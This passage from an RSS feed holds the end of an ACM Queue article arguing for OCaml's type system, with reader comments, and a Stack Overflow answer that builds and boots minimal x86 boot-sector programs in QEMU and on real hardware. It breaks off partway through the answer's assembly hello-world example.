&lt;p&gt;You can fix the code (and satisfy the compiler) by adding a handler for the missing case:&lt;br/&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;strong&gt; &lt;br/&gt;&lt;span&gt;let rec&lt;/span&gt; destutter l &lt;/strong&gt;&lt;span&gt;=&lt;/span&gt; &lt;br/&gt;&lt;span&gt;  match&lt;/span&gt; l &lt;span&gt;with&lt;/span&gt; &lt;br/&gt;&lt;span&gt;  | &lt;/span&gt;&lt;span&gt;[]                &lt;/span&gt;&lt;span&gt;-&amp;gt; &lt;/span&gt;&lt;span&gt;[]&lt;/span&gt; &lt;br/&gt;&lt;span&gt;  | x &lt;/span&gt;&lt;span&gt;:: &lt;/span&gt;&lt;span&gt;[]          &lt;/span&gt;&lt;span&gt;-&amp;gt; x &lt;/span&gt;&lt;span&gt;:: &lt;/span&gt;&lt;span&gt;[]&lt;/span&gt; &lt;br/&gt;&lt;span&gt;  | x &lt;/span&gt;&lt;span&gt;:: y &lt;/span&gt;&lt;span&gt;:: rest &lt;/span&gt;&lt;span&gt;-&amp;gt;&lt;/span&gt; &lt;br/&gt;&lt;span&gt;      if&lt;/span&gt; x &lt;span&gt;= y &lt;/span&gt;&lt;span&gt;then&lt;/span&gt; destutter &lt;span&gt;(y &lt;/span&gt;&lt;span&gt;:: rest&lt;/span&gt;&lt;span&gt;)&lt;/span&gt; &lt;br/&gt;&lt;span&gt;      else&lt;/span&gt; x &lt;span&gt;:: destutter &lt;/span&gt;&lt;span&gt;(y &lt;/span&gt;&lt;span&gt;:: rest&lt;/span&gt;&lt;span&gt;)&lt;/span&gt; &lt;br/&gt;&lt;/pre&gt;
&lt;p&gt;The error here is a trivial one that would be found easily by testing. But the type system does just as well in exposing errors that are hard to test, either because they show up only in odd corner cases that are easy to miss in testing, or because they show up in complex systems that are hard to mock up and exercise exhaustively.&lt;/p&gt;
&lt;p&gt;Straight out of the box, OCaml is pretty good at catching bugs, but it can do even more if you design your types carefully. Consider as an example the following types for representing the state of a network connection:&lt;br/&gt;&lt;/p&gt;
&lt;pre readability=&quot;5&quot;&gt;
&lt;strong readability=&quot;4&quot;&gt; &lt;br/&gt;&lt;span&gt;type&lt;/span&gt; connection_state = &lt;br/&gt;&lt;span&gt;| &lt;/span&gt;&lt;span&gt;Connecting&lt;/span&gt; &lt;br/&gt;&lt;span&gt;| &lt;/span&gt;&lt;span&gt;Connected&lt;/span&gt; &lt;br/&gt;&lt;span&gt;| &lt;/span&gt;&lt;span&gt;Disconnected&lt;/span&gt; &lt;p&gt;&lt;span&gt;type&lt;/span&gt; connection_info = { &lt;br/&gt;&lt;span&gt;  state:                   connection_state;&lt;/span&gt; &lt;br/&gt;&lt;span&gt;  server:                  inet_addr;&lt;/span&gt; &lt;br/&gt;&lt;span&gt;  last_ping_time:          time option;&lt;/span&gt; &lt;br/&gt;&lt;span&gt;  last_ping_id:            int    option;&lt;/span&gt; &lt;br/&gt;&lt;span&gt;  session_id:              string option;&lt;/span&gt; &lt;br/&gt;&lt;span&gt;  when_initiated:          time option;&lt;/span&gt; &lt;br/&gt;&lt;span&gt;  when_disconnected: time  option;&lt;/span&gt; &lt;br/&gt;&lt;span&gt;}&lt;/span&gt; &lt;/p&gt;&lt;/strong&gt;
&lt;/pre&gt;
&lt;p&gt;The &lt;code&gt;connection_state&lt;/code&gt; type is a simple enumeration of three named states that the connection can be in; &lt;code&gt;connection_info&lt;/code&gt; is a record type containing a number of fields describing different aspects of a connection. Note that the fields that have &lt;code&gt;option&lt;/code&gt; at the end of the type are essentially nullable fields. (By default, values in OCaml are guaranteed to be non-null). Other than that, there's nothing about this code that's all that different from what you might write in Java or C#.&lt;/p&gt;
&lt;p&gt;Here is some information on the individual record fields and how they relate to each other:&lt;/p&gt;
&lt;p&gt;* &lt;code&gt;server&lt;/code&gt; indicates the identity of the server on the other side of the connection.&lt;/p&gt;
&lt;p&gt;* &lt;code&gt;last_ping_time&lt;/code&gt; and &lt;code&gt;last_ping_id&lt;/code&gt; are intended to be used as part of a keep-alive protocol. Note that either both of those fields should be present, or neither of them should. Also, they should be present only when &lt;code&gt;state&lt;/code&gt; is &lt;code&gt;Connected&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;* The &lt;code&gt;session_id&lt;/code&gt; is a unique identifier that is chosen afresh every time the connection is reestablished. It also should be present only when &lt;code&gt;state&lt;/code&gt; is &lt;code&gt;Connected&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;* &lt;code&gt;when_initiated&lt;/code&gt; is for keeping track of when the attempt to start the connection began, which can be used to determine when the attempt to connect should be abandoned. This should be present only when &lt;code&gt;state&lt;/code&gt; is &lt;code&gt;Connecting&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;* &lt;code&gt;when_disconnected&lt;/code&gt; keeps track of when the connection entered the &lt;code&gt;Disconnected&lt;/code&gt; state, and should be present only in that state.&lt;/p&gt;
&lt;p&gt;As you can see, a number of invariants tie the different record fields together. Maintaining such invariants takes real work. You need to document them carefully so you don't trip over them later; you need to write tests to verify the invariants; and you must exercise continuing caution not to break the invariants as the code evolves.&lt;/p&gt;
&lt;p&gt;But we can do better. Consider the following rewrite:&lt;br/&gt;&lt;/p&gt;
&lt;pre readability=&quot;5.5&quot;&gt;
&lt;strong readability=&quot;5&quot;&gt; &lt;br/&gt;&lt;span&gt;type&lt;/span&gt; connecting   = { when_initiated:  time; } &lt;br/&gt;&lt;span&gt;type&lt;/span&gt; connected    = { last_ping  : (time * int) option; &lt;br/&gt;session_id: string; } &lt;br/&gt;&lt;span&gt;type&lt;/span&gt; disconnected = { when_disconnected: time;  } &lt;p&gt;&lt;span&gt;type&lt;/span&gt; connection_state = &lt;br/&gt;| &lt;span&gt;Connecting   &lt;/span&gt;&lt;span&gt;of&lt;/span&gt; connecting &lt;br/&gt;| &lt;span&gt;Connected    &lt;/span&gt;&lt;span&gt;of&lt;/span&gt; connected &lt;br/&gt;| &lt;span&gt;Disconnected &lt;/span&gt;&lt;span&gt;of&lt;/span&gt; disconnected &lt;/p&gt;&lt;p&gt;&lt;span&gt;type&lt;/span&gt; connection_info = { &lt;br/&gt;&lt;span&gt;   state:  connection_state;&lt;/span&gt; &lt;br/&gt;&lt;span&gt;   server: inet_addr;&lt;/span&gt; &lt;br/&gt;&lt;span&gt;}&lt;/span&gt; &lt;br/&gt;&lt;/p&gt;&lt;/strong&gt;
&lt;/pre&gt;
&lt;p&gt;We now have a combination of product and sum types that more precisely represents the set of allowable states of a connection. In particular, there is a different record type for each of the three states, each containing the information that is relevant just to that state. Information that is always relevant (in this case, just the &lt;code&gt;server&lt;/code&gt;) is pushed to the top-level record. Also, we've made it explicit that &lt;code&gt;last_ping_time&lt;/code&gt; and &lt;code&gt;last_ping_id&lt;/code&gt; are either both present or both absent by representing them as &lt;code&gt;last_ping&lt;/code&gt;, which is an optional pair.&lt;/p&gt;
&lt;p&gt;By doing all of this, we've embedded into the type many of the required invariants. Now that the invariants are part of the types, the compiler can detect and reject code that would violate these invariants. This is both less work and more reliable than maintaining such invariants by hand.&lt;/p&gt;
&lt;p&gt;The example uses algebraic datatypes to encode invariants, but OCaml has other tools for doing the same. OCaml's module system is one example, allowing you to specify invariants in the interface of a module. Unlike most object-oriented languages, OCaml makes it possible to express complex joint invariants over multiple different types. More generally, OCaml's modules are a powerful tool for breaking down a codebase into small, understandable pieces, where the interactions between those pieces is under the programmer's explicit control.&lt;/p&gt;
&lt;p&gt;The type system's ability to catch bugs is valuable even for small solitary projects, but it truly shines in a collaborative environment where multiple developers work together on a long-lived codebase. In addition to finding bugs, type signatures play a surprisingly valuable role as a kind of guaranteed-to-be-correct documentation. In the context of an evolving codebase, invariants enforced by the type system have the benefit of being more durable than those enforced by convention, in that they are less likely to be broken accidentally by another developer.&lt;br/&gt;&lt;/p&gt;
&lt;h3&gt;Limitations&lt;/h3&gt;
&lt;p&gt;None of this is to say that OCaml is without its flaws. There are, of course, all of the problems associated with being a minority language. OCaml has a great community that has generated a rich set of libraries, but that collection of libraries pales in comparison with what's available for Python, C, or Java. Similarly, development tools such as IDEs, profilers, and debuggers are there, but are considerably less mature and featureful than their cousins in more mainstream languages.&lt;/p&gt;
&lt;p&gt;Another limitation of OCaml has to do with parallelism. The OCaml runtime has a single runtime lock, which means that one must use multiple processes to take advantage of multiple cores on a single machine. For the most part, this fits our development model well: we prefer message passing to shared-memory threads as a programming model for parallelism, since it leads to code that is easier to reason about and it scales better to systems that cross multiple physical machines. The tools available in the wider OCaml world for doing this kind of multiprocess programming, however, are still maturing.&lt;/p&gt;
&lt;p&gt;But OCaml's limitations are not fundamental in nature. They have more to do with the details of the implementation or the popularity of the language and not with the language itself. In the end, that's what I find most puzzling. I am now quite convinced that the core ideas behind OCaml are enormously valuable, as evidenced by the fact that OCaml itself, whatever its limitations, is a profoundly effective and powerful tool. Yet, those ideas remain stubbornly outside of the mainstream.&lt;/p&gt;
&lt;p&gt;Perhaps this is finally on the verge of changing. Languages such as F# and Scala are bringing some of the ideas behind OCaml and Haskell to a wider audience by integrating themselves within the Dotnet and Java ecosystems, respectively. Maybe 10 years from now, we'll no longer need to ask why these ideas have failed to catch on in the wider world. But there's no reason to wait. You can add OCaml to your toolbox now.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;LOVE IT, HATE IT? LET US KNOW&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;a href=&quot;https://queue.acm.org/cdn-cgi/l/email-protection#76101313121417151d3607031303135817151b58190411&quot; target=&quot;_blank&quot;&gt;&lt;span class=&quot;__cf_email__&quot; data-cfemail=&quot;91f7f4f4f5f3f0f2fad1e0e4f4e4f4bff0f2fcbffee3f6&quot;&gt;[email protected]&lt;/span&gt;&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Yaron Minsky&lt;/strong&gt; obtained his Ph.D. in computer science from Cornell University in 2002, focusing on distributed systems. In 2003, he joined Jane Street where he founded the quantitative research group, and since 2007 he has managed the technology group there.&lt;/p&gt;
&lt;p&gt;© 2011 ACM 1542-7730/11/0900 $10.00&lt;/p&gt;
&lt;p&gt;&lt;img class=&quot;floatLeft&quot; src=&quot;https://queue.acm.org/img/q%20stamp_small.jpg&quot; width=&quot;26&quot; height=&quot;45&quot; alt=&quot;acmqueue&quot;/&gt;&lt;/p&gt;&lt;p&gt;&lt;em&gt;Originally published in Queue vol. 9, no. 9&lt;/em&gt;—&lt;br/&gt;see this item in the &lt;a href=&quot;https://portal.acm.org/citation.cfm?id=2038036&quot;&gt;ACM Digital Library&lt;/a&gt;&lt;/p&gt;
&lt;br/&gt;&lt;a href=&quot;https://twitter.com/share&quot; class=&quot;twitter-share-button&quot; data-via=&quot;ACMQueue&quot;&gt;Tweet&lt;/a&gt; 
&lt;hr noshade=&quot;noshade&quot; size=&quot;1&quot;/&gt;
Related:
&lt;p&gt;&lt;span&gt;David Chisnall&lt;/span&gt; - &lt;a href=&quot;https://queue.acm.org/detail.cfm?id=3212479&quot;&gt;&lt;strong&gt;C Is Not a Low-level Language&lt;/strong&gt;&lt;/a&gt;&lt;br/&gt;Your computer is not a fast PDP-11.&lt;/p&gt;
&lt;p&gt;&lt;span&gt;Tobias Lauinger, Abdelberi Chaabane, Christo Wilson&lt;/span&gt; - &lt;a href=&quot;https://queue.acm.org/detail.cfm?id=3205288&quot;&gt;&lt;strong&gt;Thou Shalt Not Depend on Me&lt;/strong&gt;&lt;/a&gt;&lt;br/&gt;A look at JavaScript libraries in the wild&lt;/p&gt;
&lt;p&gt;&lt;span&gt;Robert C. Seacord&lt;/span&gt; - &lt;a href=&quot;https://queue.acm.org/detail.cfm?id=3041020&quot;&gt;&lt;strong&gt;Uninitialized Reads&lt;/strong&gt;&lt;/a&gt;&lt;br/&gt;Understanding the proposed revisions to the C language&lt;/p&gt;
&lt;p&gt;&lt;span&gt;Carlos Baquero, Nuno Preguiça&lt;/span&gt; - &lt;a href=&quot;https://queue.acm.org/detail.cfm?id=2917756&quot;&gt;&lt;strong&gt;Why Logical Clocks are Easy&lt;/strong&gt;&lt;/a&gt;&lt;br/&gt;Sometimes all you need is the right language.&lt;/p&gt;
&lt;br/&gt;&lt;hr noshade=&quot;noshade&quot; size=&quot;1&quot;/&gt;&lt;h3&gt;Comments&lt;/h3&gt;
&lt;p&gt;(newest first)&lt;/p&gt;
&lt;blockquote readability=&quot;3.0508474576271&quot;&gt;
&lt;p&gt;&lt;strong&gt;Displaying 10 most recent comments. &lt;a href=&quot;https://queue.acm.org/fullcomments.cfm?id=2038036&quot;&gt;Read the full list here&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p class=&quot;author&quot;&gt;Gomile | Mon, 26 Nov 2018 13:11:14 UTC&lt;/p&gt;
This is a minor but I find the python destutter example to be terrible. One can simply write is as:
&lt;p&gt;def destutter(_list): destuttered_list = [] for val in _list: if val not in destuttered_list: destuttered_list.append(val) return destuttered_list or: set(*insert iterable here*)&lt;/p&gt;
&lt;hr size=&quot;1&quot; noshade=&quot;noshade&quot; width=&quot;160&quot;/&gt;&lt;p class=&quot;author&quot;&gt;Bilyan Borisov | Fri, 24 Jan 2014 15:01:30 UTC&lt;/p&gt;
Great article! In my opinion, most of the critics of OCaml in the comments have overlooked the fact that the language can be compiled down not only to byte code but also to native code. In the long run, a compiled application will always be faster than a Python-Ruby-Perl script.
&lt;p&gt;Conciseness aside (even though I totally agree that functional languages, with OCaml as an example, are much more succinct than Java/C++), static typing and type inference are enormously good even for moderate and small sized projects. Again, this is all a personal preference, but logically speaking a dynamically typed language will 'let you do nasty things' like :&lt;/p&gt;
&lt;p&gt;&amp;gt;&amp;gt; 4 == None&lt;/p&gt;
&lt;p&gt;which evaluate to False in Python, which will give rise to a TON of bugs that only semantic testing can catch since this is syntactically OK.&lt;/p&gt;
&lt;p&gt;Therefore, even if we assume that Python is as succinct as OCaml (or any other statically typed and compiled functional language) it will always be slower and will leave a larger margin for introducing bugs in huge codebases. However, again as the author suggests, Python does have a very serious advantage, namely, its extensive set of libraries but I personally think that they give the inexperienced programmer a false sense of awesomeness since you get the illusion of being able to do a lot without much effort.&lt;/p&gt;
&lt;p&gt;At the end of the day languages are still tools and we still love them and defend them dearly so I guess everything goes in the 'which programming language is the best' discussion.&lt;/p&gt;
&lt;hr size=&quot;1&quot; noshade=&quot;noshade&quot; width=&quot;160&quot;/&gt;&lt;p class=&quot;author&quot;&gt;Kevin Kinnell | Thu, 11 Oct 2012 19:59:40 UTC&lt;/p&gt;
&quot;First class&quot; is a CS definition, and according to that definition CL has first class functions. I got it wrong, because I didn't really say what I meant.
&lt;p&gt;I should have said &quot;easily usable first class functions.&quot;&lt;/p&gt;
&lt;p&gt;Sorry about that.&lt;/p&gt;
&lt;hr size=&quot;1&quot; noshade=&quot;noshade&quot; width=&quot;160&quot;/&gt;&lt;p class=&quot;author&quot;&gt;Jesse Talbutt | Sun, 19 Aug 2012 16:10:16 UTC&lt;/p&gt;
Unless the robot in question is the one in the first scene of Robocop. Then I'd probably use a more strongly typed language.
&lt;hr size=&quot;1&quot; noshade=&quot;noshade&quot; width=&quot;160&quot;/&gt;&lt;p class=&quot;author&quot;&gt;Jesse Talbutt | Sun, 19 Aug 2012 15:59:42 UTC&lt;/p&gt;
Common LISP does, in fact, have first-class functions. It's one of the sine qua nons of the language - i'm not sure how anyone could get that wrong.
&lt;p&gt;The main difference between LISP and Scheme is that LISP uses separate namespaces for its functions and its variables, which is an abstract that's both incredibly powerful and incredibly dangerous: all it takes is one &quot;clever&quot; code-writer using that feature to crack open a closure and you get unpredictable side-effects. I read this article wondering &quot;if they're going to use OCaml, why not just go whole hog and use LISP&quot; but I see the issue now - OCaml is like a LISP where you sacrifice power that you'll probably never use in exchange for safety: likely a premium when you're dealing with large financial transactions in real-time instead of, say, creating a natural language DSL for robots.&lt;/p&gt;
&lt;hr size=&quot;1&quot; noshade=&quot;noshade&quot; width=&quot;160&quot;/&gt;&lt;p class=&quot;author&quot;&gt;Kevin Kinnell | Mon, 11 Jun 2012 23:17:33 UTC&lt;/p&gt;
Drat. I meant &quot;last few paragraphs.&quot; C'est l'ecriture.
&lt;hr size=&quot;1&quot; noshade=&quot;noshade&quot; width=&quot;160&quot;/&gt;&lt;p class=&quot;author&quot;&gt;Kevin Kinnell | Mon, 11 Jun 2012 23:03:35 UTC&lt;/p&gt;
The readability of any code is related to knowledge of 1) the purpose of the code, 2) the language the code is written in, and 3) -- and please pardon the pun -- the knowledge of the coder.
&lt;p&gt;One can argue that literate programming obviates (1) but what it actually seems to do in practice is to add a highly-technical natural-language narrative that wrecks the flow of the program. It becomes something like reading a legal brief. Fine -- if you're a lawyer, with extensive knowledge of the arcane (meta) language of law. My apologies, Dr. Knuth, but there it is. The actual cure for (1) is a combination of a good description of the purpose of the code, and good comments.&lt;/p&gt;
&lt;p&gt;(3) is more or less a combination of innate ability and experience, whether we're talking about the writer or the reader of the code. I'd bet NO CODE reads like a natural language, but certainly there isn't any that reads like English. If you think it does, it's because you have ability and experience. Arguably, the process of &quot;speaking&quot; in a programming language seems to mirror the process of learning a natural language. In particular, the whole gamut of &quot;native speakers&quot; is there -- you can have babies talking to babies, babies talking to adults, well educated adults talking to less educated adults, etc. It's quite a bit of fun to observe. The knowledge of the coders, both the reader and the writer, is a big part of readability. Anybody who can make a language that somehow skirts this is, in my opinion, some sort of supernatural being.&lt;/p&gt;
&lt;p&gt;That leaves (2), the language the code is written in. The closest-to-objective view of that is, I think, how quickly a reader can grasp the overall purpose of a coding sequence, and integrate that into the flow of a program. In other words, can the code be &quot;grokked&quot; easily?&lt;/p&gt;
&lt;p&gt;You can create a language which makes this almost impossible to achieve -- APL comes to mind. No one could argue that APL isn't concise. Gaining the experience necessary to be able to read APL like a natural language is probably denied most ordinary mortals by their finite lifespan. I doubt that anyone can grok APL, even if they wrote the code.&lt;/p&gt;
&lt;p&gt;At the other extreme there're COBOL and Java (one programmer's opinion, of course.) If you can actually grok code written in either of these you can make a pile of money, but you have sold your soul.&lt;/p&gt;
&lt;p&gt;Lisps tend to be interrupted by their closing parentheses, but you can learn not to see them. Lisps also use a REPL, giving them the benefit of incremental coding. Unfortunately, except for Scheme dialects, functions aren't first-class in Lisps. Lisp can be grokked, but it's missing some expressive power, especially built-programmable types and type checking, making computation with types a huge burden on the programmer.&lt;/p&gt;
&lt;p&gt;Perl goes beyond Lisp in concision, and its scope-control is as good as it gets. But Perl has a steep learning curve for fluency, and functions aren't really first-class, Perl lacks a usable REPL, and Perl is missing automated type checking.&lt;/p&gt;
&lt;p&gt;OCaml manages to be concise, allows computation with types, makes functions first-class objects, has a visually clean syntax, has a REPL, does not require &quot;purity&quot; (thus allowing coder-readable access to the real world) and seems to be quite easy to learn--can you imagine a trading company requiring its traders to learn any of the languages in the last paragraph?&lt;/p&gt;
&lt;p&gt;Well expressed OCaml code is easy to grok.&lt;/p&gt;
&lt;p&gt;I think Dr. Minsky makes his case.&lt;/p&gt;
&lt;hr size=&quot;1&quot; noshade=&quot;noshade&quot; width=&quot;160&quot;/&gt;&lt;p class=&quot;author&quot;&gt;Fredrik Skeel Løkke | Tue, 13 Mar 2012 18:25:46 UTC&lt;/p&gt;
It would be wonderfull to hear how the language plays out in the context of tests. Especially regarding tests involving stubbing of external resources.
&lt;hr size=&quot;1&quot; noshade=&quot;noshade&quot; width=&quot;160&quot;/&gt;&lt;p class=&quot;author&quot;&gt;Rowan | Fri, 09 Mar 2012 05:41:37 UTC&lt;/p&gt;
@name on &quot;more practical&quot;: Actually, monadic effects and the like are quite common in OCaml. In fact about 1 month before you posted your comment, Yaron (the author) also announced a new monadic concurrency library called Async: https://ocaml.janestreet.com/?q=node/100
&lt;p&gt;For unintended side-effects, it's more a library issue than a language issue: it's pretty easy in OCaml to encapsulate effects in a monadic library, and then only use the monadic versions, banning other uses or considering them unsafe in a similar sense to Haskell's &quot;unsafePerformIO&quot;.&lt;/p&gt;
&lt;p&gt;To me the main reason I tend not to use Haskell except for small projects is that I've hit the unintended side-effect of &quot;allocating massive amounts of memory and thrashing or crashing&quot; and sometimes been unable to resolve it without digging deep into the source code of multiple libraries written by different authors. This is improving in Haskell, but I'd still trust OCaml much more for critical systems like the one described.&lt;/p&gt;
&lt;hr size=&quot;1&quot; noshade=&quot;noshade&quot; width=&quot;160&quot;/&gt;&lt;p class=&quot;author&quot;&gt;gkannan | Thu, 12 Jan 2012 15:57:31 UTC&lt;/p&gt;
Excellent article.
&lt;hr size=&quot;1&quot; noshade=&quot;noshade&quot; width=&quot;160&quot;/&gt;&lt;blockquote readability=&quot;3.0508474576271&quot;&gt;
&lt;p&gt;&lt;strong&gt;Displaying 10 most recent comments. &lt;a href=&quot;https://queue.acm.org/fullcomments.cfm?id=2038036&quot;&gt;Read the full list here&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;


&lt;hr noshade=&quot;noshade&quot; size=&quot;1&quot;/&gt;&lt;p&gt;&lt;a href=&quot;https://queue.acm.org/detail.cfm?id=2038036#&quot;&gt;&lt;img src=&quot;https://queue.acm.org/img/logo_acm.gif&quot;/&gt;&lt;/a&gt;&lt;br/&gt;© 2018 ACM, Inc. All Rights Reserved.&lt;/p&gt;
</description>
<pubDate>Mon, 26 Nov 2018 10:29:35 +0000</pubDate>
<dc:creator>alanfranzoni</dc:creator>
<dc:format>text/html</dc:format>
<dc:identifier>https://queue.acm.org/detail.cfm?id=2038036</dc:identifier>
</item>
<item>
<title>How to run a program without an operating system?</title>
<link>https://stackoverflow.com/questions/22054578/how-to-run-a-program-without-an-operating-system/32483545#32483545</link>
<guid isPermaLink="true" >https://stackoverflow.com/questions/22054578/how-to-run-a-program-without-an-operating-system/32483545#32483545</guid>
<description>&lt;p&gt;&lt;strong&gt;Runnable examples&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Technically, a program that runs without an OS, is an OS. So let's see how to create and run some minuscule hello world OSes.&lt;/p&gt;
&lt;p&gt;The code of all examples below and more is present on &lt;a href=&quot;https://github.com/cirosantilli/x86-bare-metal-examples&quot; rel=&quot;noreferrer&quot;&gt;this GitHub repo&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Boot sector&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;On x86, the simplest and lowest level thing you can do is to create a &lt;a href=&quot;https://en.wikipedia.org/wiki/Master_boot_record&quot; rel=&quot;noreferrer&quot;&gt;Master Boot Sector (MBR)&lt;/a&gt;, which is a type of &lt;a href=&quot;https://en.wikipedia.org/wiki/Boot_sector&quot; rel=&quot;noreferrer&quot;&gt;boot sector&lt;/a&gt;, and then install it to a disk.&lt;/p&gt;
&lt;p&gt;Here we create one with a single &lt;code&gt;printf&lt;/code&gt; call:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;printf '\364%509s\125\252' &amp;gt; main.img
sudo apt-get install qemu-system-x86
qemu-system-x86_64 -hda main.img
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;Outcome:&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://i.stack.imgur.com/CvZ7r.png&quot; rel=&quot;noreferrer&quot;&gt;&lt;img src=&quot;https://i.stack.imgur.com/CvZ7r.png&quot; alt=&quot;enter image description here&quot;/&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Tested on Ubuntu 18.04, QEMU 2.11.1.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;main.img&lt;/code&gt; contains the following:&lt;/p&gt;
&lt;ul readability=&quot;8&quot;&gt;&lt;li readability=&quot;11&quot;&gt;
&lt;p&gt;&lt;code&gt;\364&lt;/code&gt; in octal == &lt;code&gt;0xf4&lt;/code&gt; in hex: the encoding for a &lt;code&gt;hlt&lt;/code&gt; instruction, which tells the CPU to stop working.&lt;/p&gt;
&lt;p&gt;Therefore our program will not do anything: only start and stop.&lt;/p&gt;
&lt;p&gt;We use octal because &lt;code&gt;\x&lt;/code&gt; hex numbers are not specified by POSIX.&lt;/p&gt;
&lt;p&gt;We could obtain this encoding easily with:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;echo hlt &amp;gt; a.asm
nasm -f bin a.asm
hd a
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;but the &lt;code&gt;0xf4&lt;/code&gt; encoding is also documented on the Intel manual of course.&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;&lt;code&gt;%509s&lt;/code&gt; produce 509 spaces. Needed to fill in the file until byte 510.&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;3&quot;&gt;
&lt;p&gt;&lt;code&gt;\125\252&lt;/code&gt; in octal == &lt;code&gt;0x55&lt;/code&gt; followed by &lt;code&gt;0xaa&lt;/code&gt;: magic bytes required by the hardware. They must be bytes 511 and 512.&lt;/p&gt;
&lt;p&gt;If not present, the hardware will not treat this as a bootable disk.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;Note that even without doing anything, a few characters are already printed on the screen. Those are printed by the firmware, and serve to identify the system.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Run on real hardware&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Emulators are fun, but hardware is the real deal.&lt;/p&gt;
&lt;p&gt;Note however that this is dangerous, and you could wipe your disk by mistake: only do this on old machines that don't contain critical data! Or even better, devboards such as the Raspberry Pi, see the ARM example below.&lt;/p&gt;
&lt;p&gt;For a typical laptop, you have to do something like:&lt;/p&gt;
&lt;ul readability=&quot;6&quot;&gt;&lt;li readability=&quot;1&quot;&gt;
&lt;p&gt;Burn the image to an USB stick (will destroy your data!):&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;sudo dd if=main.img of=/dev/sdX
&lt;/code&gt;
&lt;/pre&gt;&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;plug the USB on a computer&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;turn it on&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;9&quot;&gt;
&lt;p&gt;tell it to boot from the USB.&lt;/p&gt;
&lt;p&gt;This means making the firmware pick USB before hard disk.&lt;/p&gt;
&lt;p&gt;If that is not the default behavior of your machine, keep hitting Enter, F12, ESC or other such weird keys after power-on until you get a boot menu where you can select to boot from the USB.&lt;/p&gt;
&lt;p&gt;It is often possible to configure the search order in those menus.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;For example, on my old Lenovo Thinkpad T430, UEFI BIOS 1.16, I can see:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.stack.imgur.com/WfLBl.jpg&quot; width=&quot;400&quot;/&gt;&lt;img src=&quot;https://i.stack.imgur.com/S9zBv.jpg&quot; width=&quot;400&quot;/&gt;&lt;img src=&quot;https://i.stack.imgur.com/8pIGP.jpg&quot; width=&quot;400&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Hello world&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Now that we have made a minimal program, let's move to a hello world.&lt;/p&gt;
&lt;p&gt;The obvious question is: how to do IO? A few options:&lt;/p&gt;
&lt;ul readability=&quot;5.4917647058824&quot;&gt;&lt;li&gt;ask the firmware, e.g. BIOS or UEFI, to do if for us&lt;/li&gt;
&lt;li&gt;VGA: special memory region that gets printed to the screen if written to. Can be used on Protected mode.&lt;/li&gt;
&lt;li&gt;write a driver and talk directly to the display hardware. This is the &quot;proper&quot; way to do it: more powerful, but more complex.&lt;/li&gt;
&lt;li readability=&quot;7.6537396121884&quot;&gt;
&lt;p&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Serial_port&quot; rel=&quot;noreferrer&quot;&gt;serial port&lt;/a&gt;. This is a very simple standardized protocol that sends and retrieves characters from a host terminal.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.stack.imgur.com/2WLqc.jpg&quot; width=&quot;300&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://unix.stackexchange.com/questions/307390/what-is-the-difference-between-ttys0-ttyusb0-and-ttyama0-in-linux/367882#367882&quot;&gt;Source&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;It is unfortunately not exposed on most modern laptops, but is the common way to go for development boards, see the ARM examples below.&lt;/p&gt;
&lt;p&gt;This is really a shame, since such interfaces are really useful &lt;a href=&quot;https://askubuntu.com/questions/104771/where-are-kernel-panic-logs/932380#932380&quot;&gt;to debug the Linux kernel for example&lt;/a&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;2.7352941176471&quot;&gt;
&lt;p&gt;use debug features of chips. ARM calls theirs &lt;a href=&quot;https://developer.arm.com/docs/dui0471/k/what-is-semihosting/what-is-semihosting&quot; rel=&quot;noreferrer&quot;&gt;semihosting&lt;/a&gt; for example. On real hardware, it requires some extra hardware and software support, but on emulators it can be a free convenient option. &lt;a href=&quot;https://stackoverflow.com/questions/31990487/how-to-cleanly-exit-qemu-after-executing-bare-metal-program-without-user-interve/40957928#40957928&quot;&gt;Example&lt;/a&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;Here we will do a BIOS example as it is simpler on x86. But note that it is not the most robust method.&lt;/p&gt;
&lt;p&gt;main.S&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;.code16
    mov $msg, %si
    mov $0x0e, %ah
loop:
    lodsb
    or %al, %al
    jz halt
    int $0x10
    jmp loop
halt:
    hlt
msg:
    .asciz &quot;hello world&quot;
&lt;/code&gt;
&lt;/pre&gt;
